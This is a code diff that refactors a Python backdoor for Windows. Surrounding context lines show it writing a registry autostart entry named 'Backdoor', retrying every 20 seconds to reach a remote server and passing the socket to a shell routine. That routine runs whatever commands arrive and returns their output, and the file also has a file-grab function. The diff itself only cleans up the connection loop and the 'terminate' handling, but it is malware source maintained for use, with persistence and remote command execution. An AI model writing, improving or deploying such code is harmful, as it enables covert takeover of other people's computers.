@@ -43,19 +43,16 @@ def setAutostart():
             as key:
                 wrg.SetValueEx(key, "Backdoor", 0, wrg.REG_SZ, '"' + executablePath + '"')
 
-def initiate():
-    tuneConnection()
-
-def tuneConnection():
+def connect():
     setAutostart()
     # Trying to connect to server every 20 seconds
     while True:
         try:
-            mySocket = socket.socket()
-            mySocket.connect((ip, port))
-            shell(mySocket)
+            with socket.socket() as mySocket:
+                mySocket.connect((ip, port))
+                shell(mySocket)
         except:
-            mySocket.close()
+            pass
         time.sleep(20)
 
 def letGrab(mySocket, path):
@@ -100,13 +97,7 @@ def shell(mySocket):
         commandList = command.split()
 
         if 'terminate' == commandList[0]:
-            try:
-                mySocket.close()
-                break
-            except Exception as e:
-                informToServer = "[+] Some error occured. " + str(e)
-                mySocket.send(informToServer.encode())
-                break
+            break
 
         elif 'checkUserLevel' == commandList[0]:
             try:
@@ -178,6 +169,6 @@ def shell(mySocket):
             mySocket.send(CMD.stdout.read())
 
 def main():
-    initiate()
+    connect()
 
 main()
